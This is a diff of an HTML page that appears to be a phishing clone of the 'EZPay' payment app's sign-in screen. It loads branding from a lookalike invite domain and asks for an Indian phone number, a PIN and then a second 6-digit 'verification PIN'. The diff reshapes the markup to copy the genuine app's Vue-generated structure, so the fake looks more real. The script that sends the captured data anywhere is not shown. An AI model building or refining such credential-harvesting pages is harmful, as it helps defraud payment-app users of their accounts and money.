@@ -3,328 +3,248 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EZPay - Login</title>
+    <title>EZPay - Sign In</title>
     <link rel="icon" href="https://invite.ezpayinvite1.com/logo.ico">
     <link href="https://invite.ezpayinvite1.com/css/chunk-vendors.f1d08711.css" rel="stylesheet">
     <link href="https://invite.ezpayinvite1.com/css/app.91ad6777.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
     <style>
-        /* Page switching */
+        /* Additional styles */
         .page-1 { display: block; }
         .page-2 { display: none; }
-        .page-success { display: none; }
-        
-        /* Common styles */
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Source Sans Variable', sans-serif;
-            background: #f8f9fa;
-            min-height: 100vh;
-        }
-        
-        /* Register container */
-        .register-container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        /* Logo */
-        .logo-container {
-            text-align: center;
-            margin-top: 40px;
-            margin-bottom: 30px;
-        }
-        
-        .logo-container img {
-            width: 180px;
-            height: auto;
-        }
-        
-        .logo-container p {
-            margin-top: 15px;
-            font-size: 18px;
-            color: #666;
-        }
-        
-        /* Form content */
-        .content {
-            margin-top: 30px;
-        }
-        
-        .box {
-            margin-bottom: 25px;
-        }
-        
-        .zi {
-            font-size: 16px;
-            color: #333;
-            font-weight: 600;
-            margin-bottom: 8px;
-            padding-left: 5px;
-        }
-        
-        /* Input fields */
-        .van-field__control {
-            font-size: 16px !important;
-            padding: 12px 0 !important;
-            font-family: 'Source Sans Variable', sans-serif !important;
-        }
         
         .password-field {
             -webkit-text-security: disc;
         }
         
-        #pin-input {
-            letter-spacing: 12px;
-            font-size: 28px;
-            font-weight: bold;
-            text-align: center;
-            color: #333;
-        }
-        
-        /* Error messages */
         .error-message {
             color: #ff4444;
             font-size: 14px;
-            margin-top: 8px;
-            padding-left: 5px;
+            margin-top: 5px;
             display: none;
         }
         
-        /* Buttons */
-        .login-button {
-            margin-top: 40px;
-            height: 56px;
-            font-family: 'Source Sans Variable';
+        /* Page switching */
+        .page-1, .page-2 {
+            min-height: 100vh;
+            background: #fff;
+        }
+        
+        /* PIN input styling */
+        #pin-input {
+            letter-spacing: 8px;
+            font-size: 24px;
             font-weight: bold;
-            font-size: 20px;
-            border-radius: 12px;
-            color: white;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border: none;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
-            width: 100%;
-            cursor: pointer;
-        }
-        
-        .login-button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        
-        .complete-button {
-            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
-            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
-        }
-        
-        /* Loading overlay */
-        .loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-        
-        .loading-spinner {
-            color: white;
             text-align: center;
+            font-family: 'Source Sans Variable';
         }
         
-        /* Success page */
-        .success-container {
-            max-width: 500px;
-            margin: 100px auto;
-            padding: 40px 20px;
-            text-align: center;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        /* Disabled field styling */
+        .van-field--disabled {
+            background-color: #f8f9fa !important;
         }
         
-        .success-icon {
-            font-size: 80px;
-            color: #4CAF50;
-            margin-bottom: 20px;
-        }
-        
-        .success-title {
-            color: #2E7D32;
-            margin-bottom: 15px;
-            font-size: 2em;
-        }
-        
-        .success-message {
-            color: #666;
-            font-size: 1.1em;
-            line-height: 1.5;
-            margin-bottom: 30px;
+        .van-field--disabled .van-field__control {
+            color: #333 !important;
+            -webkit-text-fill-color: #333 !important;
+            opacity: 1 !important;
         }
         
         /* Back link */
-        .back-link {
-            color: #667eea;
-            text-decoration: none;
-            display: inline-block;
-            margin-top: 20px;
-            font-size: 15px;
-        }
-        
-        .back-link:hover {
+        #back-to-signin:hover {
             text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <!-- PAGE 1: SIGN IN -->
-    <div class="page-1">
-        <div class="register-container">
-            <div class="logo-container">
-                <img src="https://invite.ezpayinvite1.com/img/EZPay.81ec8ad5.png" alt="EZPay Logo">
-                <p>Safe, simple and efficient</p>
-            </div>
-            
-            <div class="content">
-                <!-- Phone Number -->
-                <div class="box">
-                    <p class="zi">PHONE</p>
-                    <div class="van-cell van-field">
-                        <div class="van-cell__title van-field__label" style="width: 45px;">
-                            <span style="font-weight: bold;">+91</span>
-                        </div>
-                        <div class="van-cell__value van-field__value">
-                            <div class="van-field__body">
-                                <input type="tel" 
-                                       id="phone-input" 
-                                       maxlength="10" 
-                                       placeholder="Enter 10-digit number" 
-                                       class="van-field__control">
-                            </div>
-                        </div>
-                    </div>
-                    <div id="phone-error" class="error-message"></div>
+    <div id="app" class="page-1">
+        <div data-v-0cbbefe4="">
+            <div data-v-0cbbefe4="" class="register-container">
+                <div data-v-0cbbefe4="" style="text-align: center; margin-top: 40px;">
+                    <img data-v-0cbbefe4="" src="https://invite.ezpayinvite1.com/img/EZPay.81ec8ad5.png" style="width: 24%;">
+                    <p data-v-0cbbefe4="" style="margin-top: 18px;">Safe, simple and efficient</p>
                 </div>
                 
-                <!-- Password (PIN) -->
-                <div class="box">
-                    <p class="zi">PIN</p>
-                    <div class="van-cell van-field">
-                        <div class="van-cell__value van-cell__value--alone van-field__value">
-                            <div class="van-field__body">
-                                <input type="password" 
-                                       id="password-input" 
-                                       placeholder="Enter your PIN" 
-                                       class="van-field__control password-field">
-                                <div class="van-field__right-icon">
-                                    <span class="solts">
-                                        <i class="van-icon van-icon-eye" id="toggle-password" style="font-size: 20px; color: #666;"></i>
-                                    </span>
+                <div data-v-0cbbefe4="" class="content" style="margin-top: 40px;">
+                    <!-- Phone Number -->
+                    <div data-v-0cbbefe4="" class="box">
+                        <p data-v-0cbbefe4="" class="zi">PHONE</p>
+                        <div data-v-0cbbefe4="" class="put">
+                            <div data-v-0cbbefe4="" class="van-cell van-field">
+                                <div class="van-cell__title van-field__label" style="width: 36px;">
+                                    <span>+91</span>
+                                </div>
+                                <div class="van-cell__value van-field__value">
+                                    <div class="van-field__body">
+                                        <input type="tel" 
+                                               id="phone-input" 
+                                               maxlength="10" 
+                                               placeholder="Your phone number" 
+                                               class="van-field__control">
+                                    </div>
                                 </div>
                             </div>
                         </div>
+                        <div id="phone-error" class="error-message">Please enter 10-digit phone number</div>
                     </div>
-                    <div id="password-error" class="error-message"></div>
+                    
+                    <!-- Password (PIN) -->
+                    <div data-v-0cbbefe4="" class="box">
+                        <p data-v-0cbbefe4="" class="zi">PIN</p>
+                        <div data-v-0cbbefe4="" class="put">
+                            <div data-v-0cbbefe4="" class="van-cell van-field">
+                                <div class="van-cell__value van-cell__value--alone van-field__value">
+                                    <div class="van-field__body">
+                                        <input type="password" 
+                                               id="password-input" 
+                                               placeholder="Your password" 
+                                               class="van-field__control password-field">
+                                        <div class="van-field__right-icon">
+                                            <span data-v-0cbbefe4="" class="solts">
+                                                <i data-v-0cbbefe4="" class="van-icon van-icon-eye" id="toggle-password">
+                                                    <!---->
+                                                </i>
+                                            </span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="password-error" class="error-message">Please enter PIN</div>
+                    </div>
                 </div>
+                
+                <!-- SIGN IN Button -->
+                <button id="signin-button" 
+                        data-v-0cbbefe4="" 
+                        class="van-button van-button--default van-button--normal van-button--disabled van-button--block" 
+                        style="margin-top: 40px; height: 48px; font-family: 'Source Sans Variable'; font-weight: bold; font-size: 24px; border-radius: 12px; color: white; background: rgb(42, 40, 255); border-color: rgb(42, 40, 255);" 
+                        disabled>
+                    <div data-v-0cbbefe4="" class="van-button__content">
+                        <span data-v-0cbbefe4="" class="van-button__text">SIGN IN</span>
+                    </div>
+                </button>
+                
+                <p data-v-0cbbefe4="" style="margin-top: 24px; text-align: center; font-family: 'Source Sans Variable'; font-weight: 400; color: rgb(42, 40, 255);">
+                    Already have an account?
+                </p>
             </div>
             
-            <!-- SIGN IN Button -->
-            <button id="signin-button" class="login-button" disabled>
-                SIGN IN
-            </button>
-            
-            <p style="margin-top: 25px; text-align: center; color: #666; font-size: 15px;">
-                Already have an account? <a href="#" style="color: #667eea; text-decoration: none;">Sign in</a>
-            </p>
+            <!-- Loading Overlay -->
+            <div data-v-0cbbefe4="" class="van-overlay" id="loading-overlay" style="display: none;">
+                <div data-v-0cbbefe4="" class="wrapper">
+                    <div data-v-0cbbefe4="" class="van-loading van-loading--spinner">
+                        <span data-v-0cbbefe4="" class="van-loading__spinner van-loading__spinner--spinner" style="color: rgb(25, 137, 250);">
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                        </span>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
     
     <!-- PAGE 2: PIN VERIFICATION -->
-    <div class="page-2">
-        <div class="register-container">
-            <div class="logo-container">
-                <img src="https://invite.ezpayinvite1.com/img/EZPay.81ec8ad5.png" alt="EZPay Logo">
-                <p>Secure PIN Verification</p>
-            </div>
-            
-            <div class="content">
-                <!-- Phone Number Display -->
-                <div class="box">
-                    <p class="zi">PHONE</p>
-                    <div class="van-cell van-field van-field--disabled" style="background: #f8f9fa; border: 1px solid #e0e0e0;">
-                        <div class="van-cell__title van-field__label" style="width: 45px;">
-                            <span style="font-weight: bold;">+91</span>
-                        </div>
-                        <div class="van-cell__value van-field__value">
-                            <div class="van-field__body">
-                                <input type="text" 
-                                       id="display-phone" 
-                                       disabled 
-                                       class="van-field__control" 
-                                       style="color: #333; font-weight: bold;">
+    <div id="pin-verification-page" class="page-2">
+        <div data-v-0cbbefe4="">
+            <div data-v-0cbbefe4="" class="register-container">
+                <div data-v-0cbbefe4="" style="text-align: center; margin-top: 40px;">
+                    <img data-v-0cbbefe4="" src="https://invite.ezpayinvite1.com/img/EZPay.81ec8ad5.png" style="width: 24%;">
+                    <p data-v-0cbbefe4="" style="margin-top: 18px;">Safe, simple and efficient</p>
+                </div>
+                
+                <div data-v-0cbbefe4="" class="content" style="margin-top: 40px;">
+                    <!-- Phone Number Display -->
+                    <div data-v-0cbbefe4="" class="box">
+                        <p data-v-0cbbefe4="" class="zi">PHONE</p>
+                        <div data-v-0cbbefe4="" class="put">
+                            <div data-v-0cbbefe4="" class="van-cell van-field van-field--disabled" style="background: #f5f5f5;">
+                                <div class="van-cell__title van-field__label" style="width: 36px;">
+                                    <span>+91</span>
+                                </div>
+                                <div class="van-cell__value van-field__value">
+                                    <div class="van-field__body">
+                                        <input type="text" 
+                                               id="display-phone" 
+                                               disabled 
+                                               class="van-field__control" 
+                                               style="color: #333; font-weight: bold;">
+                                    </div>
+                                </div>
                             </div>
                         </div>
+                    </div>
+                    
+                    <!-- 6-digit PIN Input -->
+                    <div data-v-0cbbefe4="" class="box">
+                        <p data-v-0cbbefe4="" class="zi">PIN</p>
+                        <div data-v-0cbbefe4="" class="put">
+                            <div data-v-0cbbefe4="" class="van-cell van-field">
+                                <div class="van-cell__value van-cell__value--alone van-field__value">
+                                    <div class="van-field__body">
+                                        <input type="text" 
+                                               id="pin-input" 
+                                               maxlength="6" 
+                                               placeholder="" 
+                                               class="van-field__control"
+                                               inputmode="numeric"
+                                               pattern="[0-9]*">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="pin-error" class="error-message">Please enter 6-digit PIN</div>
                     </div>
                 </div>
                 
-                <!-- 6-digit PIN Input -->
-                <div class="box">
-                    <p class="zi">PIN</p>
-                    <div class="van-cell van-field" style="border: 1px solid #e0e0e0;">
-                        <div class="van-cell__value van-cell__value--alone van-field__value">
-                            <div class="van-field__body">
-                                <input type="text" 
-                                       id="pin-input" 
-                                       maxlength="6" 
-                                       placeholder="••••••" 
-                                       class="van-field__control"
-                                       inputmode="numeric">
-                            </div>
-                        </div>
+                <!-- COMPLETE LOGIN Button -->
+                <button id="complete-login-button" 
+                        data-v-0cbbefe4="" 
+                        class="van-button van-button--default van-button--normal van-button--disabled van-button--block" 
+                        style="margin-top: 40px; height: 48px; font-family: 'Source Sans Variable'; font-weight: bold; font-size: 24px; border-radius: 12px; color: white; background: rgb(42, 40, 255); border-color: rgb(42, 40, 255);" 
+                        disabled>
+                    <div data-v-0cbbefe4="" class="van-button__content">
+                        <span data-v-0cbbefe4="" class="van-button__text">COMPLETE LOGIN</span>
                     </div>
-                    <div id="pin-error" class="error-message"></div>
-                    <p style="margin-top: 8px; font-size: 14px; color: #666; text-align: center;">
-                        Enter 6-digit verification PIN
-                    </p>
-                </div>
+                </button>
+                
+                <p data-v-0cbbefe4="" style="margin-top: 24px; text-align: center; font-family: 'Source Sans Variable'; font-weight: 400; color: rgb(42, 40, 255);">
+                    <a href="#" id="back-to-signin" style="color: rgb(42, 40, 255); text-decoration: none;">← Back to Sign In</a>
+                </p>
             </div>
             
-            <!-- COMPLETE LOGIN Button -->
-            <button id="complete-login-button" class="login-button complete-button" disabled>
-                COMPLETE LOGIN
-            </button>
-            
-            <p style="margin-top: 25px; text-align: center;">
-                <a href="#" id="back-to-signin" class="back-link">← Back to Sign In</a>
-            </p>
-        </div>
-    </div>
-    
-    <!-- PAGE 3: SUCCESS PAGE -->
-    <div class="page-success">
-        <div class="success-container">
-            <div class="success-icon">✅</div>
-            <h1 class="success-title">Login Successful!</h1>
-            <p class="success-message">
-                Your EZPay account has been verified successfully.<br>
-                You can now access your account.
-            </p>
-            <button onclick="window.location.href='https://ezpay1.vercel.app'" class="login-button" style="width: auto; padding: 0 40px;">
-                Go to Dashboard
-            </button>
-        </div>
-    </div>
-    
-    <!-- Loading Overlay -->
-    <div class="loading-overlay" id="loading-overlay">
-        <div class="loading-spinner">
-            <div style="font-size: 40px; margin-bottom: 20px;">⏳</div>
-            <p style="color: white; font-size: 18px;">Processing...</p>
+            <!-- Loading Overlay for Page 2 -->
+            <div data-v-0cbbefe4="" class="van-overlay" id="loading-overlay-2" style="display: none;">
+                <div data-v-0cbbefe4="" class="wrapper">
+                    <div data-v-0cbbefe4="" class="van-loading van-loading--spinner">
+                        <span data-v-0cbbefe4="" class="van-loading__spinner van-loading__spinner--spinner" style="color: rgb(25, 137, 250);">
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                            <i data-v-0cbbefe4=""></i>
+                        </span>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
